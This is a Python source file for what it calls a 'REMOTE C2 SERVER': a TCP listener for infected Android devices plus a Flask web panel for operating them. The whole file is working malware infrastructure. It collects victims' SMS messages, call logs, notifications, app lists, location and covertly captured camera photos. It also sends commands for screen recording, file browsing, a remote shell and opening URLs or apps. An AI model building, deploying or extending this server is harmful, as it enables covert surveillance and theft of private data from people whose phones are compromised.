#!/usr/bin/env python3
import socket
import json
import threading
import base64
from datetime import datetime
import time
import logging
import sys
import os
from colorama import init, Fore, Style
import signal
from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit
from queue import Queue

# ==================== KONFIGURASI ====================
TCP_PORT = int(os.environ.get('TCP_PORT', 9090))
WEB_PORT = int(os.environ.get('WEB_PORT', 9191))
HOST = '0.0.0.0'

# ==================== GLOBALS ====================
client_socket = None
client_address = None
running = True
in_shell_mode = False
device_current_dir = "/"
connected_devices = {}
device_data_queues = {}
current_device = None
command_queue = Queue()

# ==================== SETUP ====================
init(autoreset=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Buat direktori
for dir_name in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads', 'web_images']:
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

print(Fore.CYAN + "=" * 80)
print(Fore.CYAN + "     REMOTE C2 SERVER - TCP + WEB")
print(Fore.CYAN + f"     TCP Port (Device): {TCP_PORT}")
print(Fore.CYAN + f"     WEB Port (Browser): {WEB_PORT}")
print(Fore.CYAN + "=" * 80)

# ==================== FLASK APP ====================
app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'anon-c2-system-v1')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode=None)

# ==================== ROUTES WEB ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'devices_connected': len(connected_devices),
        'tcp_port': TCP_PORT,
        'web_port': WEB_PORT
    })

@app.route('/api/devices')
def get_devices():
    devices_list = []
    for device_id, info in connected_devices.items():
        devices_list.append({
            'id': device_id,
            'model': info.get('model', 'Unknown'),
            'manufacturer': info.get('manufacturer', 'Unknown'),
            'android_version': info.get('android_version', 'Unknown'),
            'battery': info.get('battery', 'Unknown'),
            'last_seen': info.get('last_seen', datetime.now().isoformat()),
            'ip': info.get('ip', 'Unknown')
        })
    return jsonify({'devices': devices_list})

@app.route('/api/select_device', methods=['POST'])
def select_device():
    global current_device
    data = request.json
    device_id = data.get('device_id')
    
    if device_id in connected_devices:
        current_device = device_id
        logger.info(f"Device selected: {device_id}")
        return jsonify({'status': 'success', 'device': connected_devices[device_id]})
    return jsonify({'status': 'error', 'message': 'Device not found'}), 404

@app.route('/api/device_info')
def get_device_info():
    if current_device and current_device in connected_devices:
        return jsonify(connected_devices[current_device])
    return jsonify({'status': 'error', 'message': 'No device selected'}), 400

@app.route('/api/command', methods=['POST'])
def send_command():
    if not current_device:
        return jsonify({'status': 'error', 'message': 'No device selected'}), 400
    
    data = request.json
    command = data.get('command')
    params = data.get('params', {})
    
    cmd_str = format_command(command, params)
    
    # Queue command untuk dikirim ke device
    command_queue.put({
        'device_id': current_device,
        'command': cmd_str
    })
    
    logger.info(f"Command queued: {cmd_str}")
    
    return jsonify({'status': 'queued', 'command': cmd_str})

@app.route('/api/data', methods=['POST'])
def receive_data():
    """Menerima data dari TCP server (internal)"""
    try:
        data = request.json
        data_type = data.get('type')
        payload = data.get('payload')
        client_info = data.get('client_info', {})
        
        device_id = client_info.get('address', f"device_{len(connected_devices)}")
        
        if data_type == 'DEVICE_INFO':
            connected_devices[device_id] = {
                'id': device_id,
                'ip': client_info.get('address'),
                'model': payload.get('Model'),
                'manufacturer': payload.get('Manufacturer'),
                'android_version': payload.get('AndroidVersion'),
                'battery': payload.get('Battery'),
                'last_seen': datetime.now().isoformat()
            }
            socketio.emit('device_connected', connected_devices[device_id])
            logger.info(f"Device connected: {payload.get('Model')}")
        
        if device_id not in device_data_queues:
            device_data_queues[device_id] = []
        
        device_data_queues[device_id].append({
            'type': data_type,
            'payload': payload,
            'timestamp': datetime.now().isoformat()
        })
        
        # Broadcast ke web client yang sedang memilih device ini
        if current_device == device_id:
            socketio.emit('device_data', {
                'type': data_type,
                'payload': payload,
                'timestamp': datetime.now().isoformat()
            })
        
        # Handle specific data types
        if data_type == 'SMS_LOG':
            socketio.emit('new_sms', payload.get('log', {}))
        elif data_type == 'CALL_LOG':
            socketio.emit('new_call', payload.get('log', {}))
        elif data_type == 'NOTIFICATION_DATA':
            socketio.emit('new_notification', payload.get('notification', {}))
        elif data_type == 'IMAGE_DATA':
            save_image_for_web(payload.get('image', {}), device_id)
        elif data_type == 'APP_LIST':
            socketio.emit('app_list', payload.get('apps', []))
        elif data_type == 'SHELL_LS_RESULT':
            socketio.emit('shell_result', {'type': 'ls', 'data': payload.get('files', [])})
        elif data_type == 'SHELL_CD_SUCCESS':
            global device_current_dir
            device_current_dir = payload.get("current_dir", "/")
            socketio.emit('shell_result', {'type': 'cd', 'dir': device_current_dir})
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Error in receive_data: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/sms_logs')
def get_sms_logs():
    if not current_device:
        return jsonify([])
    
    logs = []
    if current_device in device_data_queues:
        for item in reversed(device_data_queues[current_device]):
            if item['type'] == 'SMS_LOG':
                logs.append(item['payload'].get('log', {}))
                if len(logs) >= 50:
                    break
    return jsonify(logs)

@app.route('/api/call_logs')
def get_call_logs():
    if not current_device:
        return jsonify([])
    
    logs = []
    if current_device in device_data_queues:
        for item in reversed(device_data_queues[current_device]):
            if item['type'] == 'CALL_LOG':
                logs.append(item['payload'].get('log', {}))
                if len(logs) >= 50:
                    break
    return jsonify(logs)

@app.route('/api/apps')
def get_apps():
    if not current_device:
        return jsonify([])
    
    apps = []
    if current_device in device_data_queues:
        for item in reversed(device_data_queues[current_device]):
            if item['type'] == 'APP_LIST':
                apps = item['payload'].get('apps', [])
                break
    return jsonify(apps)

@app.route('/api/notifications')
def get_notifications():
    if not current_device:
        return jsonify([])
    
    notifs = []
    if current_device in device_data_queues:
        for item in reversed(device_data_queues[current_device]):
            if item['type'] == 'NOTIFICATION_DATA':
                notifs.append(item['payload'].get('notification', {}))
                if len(notifs) >= 50:
                    break
    return jsonify(notifs)

@app.route('/api/image/<filename>')
def get_image(filename):
    try:
        return send_file(os.path.join('web_images', filename))
    except:
        return jsonify({'error': 'Image not found'}), 404

# ==================== SOCKETIO EVENTS ====================
@socketio.on('connect')
def handle_connect():
    logger.info(f"Web client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Web client disconnected: {request.sid}")

@socketio.on('request_devices')
def handle_request_devices():
    devices_list = []
    for device_id, info in connected_devices.items():
        devices_list.append({
            'id': device_id,
            'model': info.get('model', 'Unknown'),
            'manufacturer': info.get('manufacturer', 'Unknown'),
            'battery': info.get('battery', 'Unknown')
        })
    emit('devices_list', devices_list)

@socketio.on('select_device')
def handle_select_device(data):
    global current_device
    device_id = data.get('device_id')
    
    if device_id in connected_devices:
        current_device = device_id
        emit('device_selected', connected_devices[device_id])
        logger.info(f"Device selected via socket: {device_id}")

@socketio.on('web_command')
def handle_web_command(data):
    if not current_device:
        emit('command_error', {'message': 'No device selected'})
        return
    
    cmd = data.get('command')
    params = data.get('params', {})
    
    cmd_str = format_command(cmd, params)
    command_queue.put({
        'device_id': current_device,
        'command': cmd_str
    })
    
    emit('command_sent', {'command': cmd_str})

# ==================== HELPER FUNCTIONS ====================
def format_command(cmd, params):
    commands = {
        'run': f"run {params.get('package')}",
        'open': f"open {params.get('url')}",
        'toast': f"toast {params.get('action')} {params.get('text')}",
        'shell': "shell",
        'getsms': "getsms",
        'getcalllogs': "getcalllogs",
        'list_app': "list_app",
        'get_location': "get_location",
        'takefrontpic': "takefrontpic",
        'takebackpic': "takebackpic",
        'flashon': "flashon",
        'flashoff': "flashoff",
        'notifikasi': "notifikasi",
        'gallery': "gallery",
        'deviceinfo': "deviceinfo",
        'screen_recorder': "screen_recorder",
        'filemanager': "filemanager",
        'ls': "ls",
        'pwd': "pwd",
        'cd': f"cd {params.get('path', '/')}",
        'exit_shell': "exit_shell"
    }
    return commands.get(cmd, cmd)

def save_image_for_web(image_data, device_id):
    try:
        filename = image_data.get('filename', f"img_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        filename = "".join(c for c in filename if c.isalnum() or c in '._-')
        filepath = os.path.join('web_images', f"{device_id}_{filename}")
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(image_data.get('image_base64', '')))
        
        socketio.emit('new_image', {
            'filename': filename,
            'url': f'/api/image/{device_id}_{filename}',
            'timestamp': datetime.now().isoformat()
        })
        
        logger.info(f"Image saved: {filename}")
    except Exception as e:
        logger.error(f"Error saving image: {e}")

def forward_to_web(data_type, payload):
    """Mengirim data dari TCP ke Flask (internal)"""
    if not client_address:
        return
    
    try:
        data_to_send = {
            'type': data_type,
            'payload': payload,
            'client_info': {
                'address': client_address[0],
                'timestamp': datetime.now().isoformat()
            }
        }
        
        # Kirim ke endpoint internal Flask
        with app.test_client() as client:
            client.post('/api/data', json=data_to_send)
    except Exception as e:
        logger.error(f"Forward error: {e}")

# ==================== TCP SERVER FUNCTIONS ====================
def handle_device_info(info):
    logger.info(f"Device connected: {info.get('Model', 'Unknown')}")
    forward_to_web('DEVICE_INFO', info)

def handle_sms(log):
    logger.info(f"SMS from {log.get('userSender', 'N/A')}")
    forward_to_web('SMS_LOG', {'log': log})

def handle_call(log):
    logger.info(f"Call from {log.get('number', 'N/A')}")
    forward_to_web('CALL_LOG', {'log': log})

def handle_image(image_data):
    try:
        filename = image_data.get('filename', f"img_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        filepath = os.path.join('captured_images', filename)
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(image_data.get('image_base64', '')))
        
        # Save for web
        web_path = os.path.join('web_images', f"device_{filename}")
        with open(web_path, 'wb') as f:
            f.write(base64.b64decode(image_data.get('image_base64', '')))
        
        logger.info(f"Image saved: {filename}")
        forward_to_web('IMAGE_DATA', {'image': {**image_data, 'web_path': f'/api/image/device_{filename}'}})
    except Exception as e:
        logger.error(f"Failed to save image: {e}")

def handle_incoming_data(data):
    try:
        payload = json.loads(data).get('data', {})
        log_type = payload.get('type', 'UNKNOWN')
        
        if log_type == 'DEVICE_INFO':
            handle_device_info(payload.get('info'))
        elif log_type == 'SMS_LOG':
            handle_sms(payload.get('log'))
        elif log_type == 'CALL_LOG':
            handle_call(payload.get('log'))
        elif log_type == 'IMAGE_DATA':
            handle_image(payload.get('image'))
        elif log_type == 'APP_LIST':
            forward_to_web('APP_LIST', payload)
        elif log_type == 'LOCATION_SUCCESS':
            forward_to_web('LOCATION_SUCCESS', payload)
        elif log_type == 'NOTIFICATION_DATA':
            forward_to_web('NOTIFICATION_DATA', {'notification': payload.get('notification')})
        elif log_type in ['SHELL_LS_RESULT', 'SHELL_CD_SUCCESS', 'FILE_MANAGER_RESULT']:
            forward_to_web(log_type, payload)
        else:
            forward_to_web(log_type, payload)
            
    except Exception as e:
        logger.error(f"Error handling data: {e}")

def client_listener(sock):
    buffer = ""
    while running and sock:
        try:
            data = sock.recv(16384).decode('utf-8', errors='ignore')
            if not data:
                break
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip():
                    handle_incoming_data(line.strip())
        except Exception as e:
            logger.error(f"Listener error: {e}")
            break
    
    logger.info("Client disconnected")
    global client_socket
    client_socket = None

def command_processor():
    """Thread untuk mengirim command dari queue ke device"""
    global client_socket
    
    while running:
        try:
            if not command_queue.empty() and client_socket:
                cmd_data = command_queue.get()
                if cmd_data['device_id'] == client_address[0] if client_address else None:
                    cmd = cmd_data['command']
                    logger.info(f"Sending command: {cmd}")
                    client_socket.sendall(f"{cmd}\n".encode())
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Command processor error: {e}")

def tcp_server():
    """Jalanin TCP server di thread terpisah"""
    global client_socket, client_address, running
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, TCP_PORT))
        server_socket.listen(5)
        logger.info(f"TCP Server ready on port {TCP_PORT}")
        
        while running:
            try:
                server_socket.settimeout(1.0)
                conn, addr = server_socket.accept()
                conn.settimeout(5.0)
                client_socket, client_address = conn, addr
                
                print(f"\n{Fore.GREEN}[+] Device connected from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                logger.info(f"Device connected from {addr[0]}:{addr[1]}")
                
                threading.Thread(target=client_listener, args=(conn,), daemon=True).start()
                
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Accept error: {e}")
                time.sleep(1)
        
    except Exception as e:
        logger.error(f"TCP Server error: {e}")
    finally:
        server_socket.close()

# ==================== MAIN ====================
def main():
    global running
    
    def signal_handler(sig, frame):
        global running
        running = False
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start TCP server di thread terpisah
    tcp_thread = threading.Thread(target=tcp_server, daemon=True)
    tcp_thread.start()
    
    # Start command processor thread
    cmd_thread = threading.Thread(target=command_processor, daemon=True)
    cmd_thread.start()
    
    # Start Flask web server
    logger.info(f"Web server starting on port {WEB_PORT}")
    socketio.run(app, host=HOST, port=WEB_PORT, debug=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    main()
